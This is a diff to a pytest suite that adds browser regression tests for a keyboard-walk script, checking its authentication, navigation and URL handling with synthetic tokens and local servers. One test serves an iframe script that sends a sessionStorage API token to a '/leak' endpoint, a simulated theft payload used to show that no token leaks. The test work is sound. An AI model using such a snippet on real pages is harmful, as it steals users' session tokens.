@@ -1,7 +1,8 @@
-"""Opt-in browser regressions for capture safety; all tokens and servers are synthetic.
+"""Browser regressions for capture and keyboard-walk safety with synthetic data.
 
-Set STUDIO_SCREENSHOT_CHROME and STUDIO_PUPPETEER_CORE to run. These tests do not
-prove historical image provenance and never need a real Studio checkout store.
+Set STUDIO_SCREENSHOT_CHROME and STUDIO_PUPPETEER_CORE to run locally; CI requires
+them. These tests do not prove historical image provenance and never need a real
+Studio checkout store.
 """
 
 from __future__ import annotations
@@ -23,6 +24,7 @@ import pytest
 
 ROOT = Path(__file__).resolve().parents[1]
 CAPTURE = ROOT / "scripts" / "capture_screenshots.mjs"
+WALK = ROOT / "scripts" / "keyboard_walk.mjs"
 TOKEN = "synthetic-screenshot-token-0123456789"
 TABS = ("start", "harness", "hall", "council", "debate", "chat")
 
@@ -131,6 +133,14 @@ def _run(
         text=True,
         timeout=40,
         check=False,
+    )
+
+
+def _walk(base: str, env: dict[str, str], token: str = TOKEN):
+    return subprocess.run(
+        ["node", str(WALK), "--base-url", base, "--token", token,
+         "--timeout-ms", "4000", "--settle-ms", "100", "--json"],
+        cwd=ROOT, env=env, capture_output=True, text=True, timeout=40, check=False,
     )
 
 
@@ -389,6 +399,12 @@ def test_real_isolated_demo_captures_all_six_panes(
         assert [entry["tab"] for entry in index["shots"]] == ["start", "chat"]
         assert {p.name for p in variant_out.glob("*.png")} == {"start.png", "chat.png"}
         assert banner["token"] not in variant.stdout + variant.stderr
+        walk = _walk(banner["url"], browser_env, token=banner["token"])
+        assert walk.returncode == 0, walk.stderr
+        walk_result = json.loads(walk.stdout)
+        assert walk_result["failed"] == 0
+        assert walk_result["passed"] == 22
+        assert banner["token"] not in walk.stdout + walk.stderr
         assert sentinel.read_bytes() == before
         assert [p for p in store.rglob("*") if p.is_file()] == [sentinel]
     finally:
@@ -399,3 +415,137 @@ def test_real_isolated_demo_captures_all_six_panes(
         except subprocess.TimeoutExpired:
             os.killpg(demo.pid, signal.SIGKILL)
             demo.communicate(timeout=5)
+
+
+def test_keyboard_walker_does_not_seed_cross_origin_frame(browser_env: dict[str, str]) -> None:
+    received: list[str] = []
+
+    class Foreign(BaseHTTPRequestHandler):
+        def do_GET(self):
+            parsed = urlsplit(self.path)
+            if parsed.path == "/leak":
+                received.append(parse_qs(parsed.query, keep_blank_values=True).get("token", [""])[0])
+                self.send_response(204)
+                self.end_headers()
+                return
+            self.send_response(200)
+            self.send_header("Content-Type", "text/html")
+            self.end_headers()
+            self.wfile.write(b"<script>fetch('/leak?token='+encodeURIComponent(sessionStorage.getItem('m5_api_token')||''))</script>")
+
+        def log_message(self, *_args):
+            pass
+
+    with server(Foreign) as foreign:
+        class Main(BaseHTTPRequestHandler):
+            def do_GET(self):
+                if self.path == "/api/workspace/directory":
+                    if self.headers.get("Authorization") != f"Bearer {TOKEN}":
+                        self.send_response(401)
+                        self.end_headers()
+                        return
+                    self.send_response(200)
+                    self.send_header("Content-Type", "application/json")
+                    self.end_headers()
+                    self.wfile.write(b'{"workspace_dir":"/synthetic","recent_dirs":[]}')
+                    return
+                self.send_response(200)
+                self.send_header("Content-Type", "text/html")
+                self.end_headers()
+                self.wfile.write(page(f'<iframe src="{foreign}/"></iframe>'))
+
+            def log_message(self, *_args):
+                pass
+
+        with server(Main) as origin:
+            result = _walk(origin, browser_env)
+    # The synthetic capture page is not a keyboard shell, so a walk should fail,
+    # but the iframe must actually load and must not receive the token.
+    assert result.returncode != 0
+    assert received == [""]
+    assert TOKEN not in result.stdout + result.stderr
+
+
+@pytest.mark.parametrize("kind", ["bad-token", "auth-disabled", "api-redirect", "redirect", "error-document", "browser-unauthenticated", "late-navigation", "hash-navigation", "reload"])
+def test_keyboard_walker_rejects_auth_and_navigation_failures(
+    browser_env: dict[str, str], kind: str
+) -> None:
+    target_requests: list[str] = []
+
+    class Target(BaseHTTPRequestHandler):
+        def do_GET(self):
+            target_requests.append(self.path)
+            self.send_response(200)
+            self.end_headers()
+
+        def log_message(self, *_args):
+            pass
+
+    with server(Target) as target:
+        class Main(BaseHTTPRequestHandler):
+            def do_GET(self):
+                if self.path == "/api/workspace/directory":
+                    if kind != "auth-disabled" and self.headers.get("Authorization") != f"Bearer {TOKEN}":
+                        self.send_response(401)
+                        self.end_headers()
+                        return
+                    if kind == "api-redirect":
+                        self.send_response(302)
+                        self.send_header("Location", target + "/")
+                        self.end_headers()
+                        return
+                    self.send_response(200)
+                    self.send_header("Content-Type", "application/json")
+                    self.end_headers()
+                    self.wfile.write(b'{"workspace_dir":"/synthetic","recent_dirs":[]}')
+                    return
+                if kind == "redirect":
+                    self.send_response(302)
+                    self.send_header("Location", target + "/")
+                    self.end_headers()
+                    return
+                self.send_response(404 if kind == "error-document" else 200)
+                self.send_header("Content-Type", "text/html")
+                self.end_headers()
+                body = page(broken_auth=kind == "browser-unauthenticated")
+                action = {
+                    "late-navigation": f"location.href={json.dumps(target + '/')}",
+                    "hash-navigation": "location.hash='unexpected'",
+                    "reload": "location.reload()",
+                }.get(kind)
+                if action:
+                    body += f"<script>setTimeout(()=>{{{action}}}, 150)</script>".encode()
+                self.wfile.write(body)
+
+            def log_message(self, *_args):
+                pass
+
+        with server(Main) as origin:
+            supplied = "incorrect-synthetic-token-0123456789" if kind == "bad-token" else TOKEN
+            result = _walk(origin, browser_env, token=supplied)
+    assert result.returncode != 0, result.stdout
+    assert TOKEN not in result.stdout + result.stderr
+    assert target_requests == []
+    expected = {
+        "bad-token": "did not accept the supplied token",
+        "auth-disabled": "did not require authentication",
+        "api-redirect": "did not accept the supplied token",
+        "redirect": "net::ERR_FAILED",
+        "error-document": "direct successful HTML",
+        "browser-unauthenticated": "browser could not authenticate",
+        "late-navigation": "unexpected main-frame navigation",
+        "hash-navigation": "unexpected main-frame navigation",
+        "reload": "unexpected main-frame navigation",
+    }
+    assert expected[kind] in result.stderr
+
+
+@pytest.mark.parametrize("base", ["https://example.com", "http://127.0.0.1:1234/path", "http://user:pass@127.0.0.1:1234", "http://localhost:1234/?x=1", "file:///tmp/demo"])
+def test_keyboard_walker_rejects_non_demo_urls(base: str) -> None:
+    result = subprocess.run(
+        ["node", str(WALK), "--base-url", base, "--token", TOKEN],
+        cwd=ROOT, capture_output=True, text=True, timeout=10, check=False,
+    )
+    assert result.returncode != 0
+    assert "--base-url must be" in result.stderr
+    assert TOKEN not in result.stdout + result.stderr
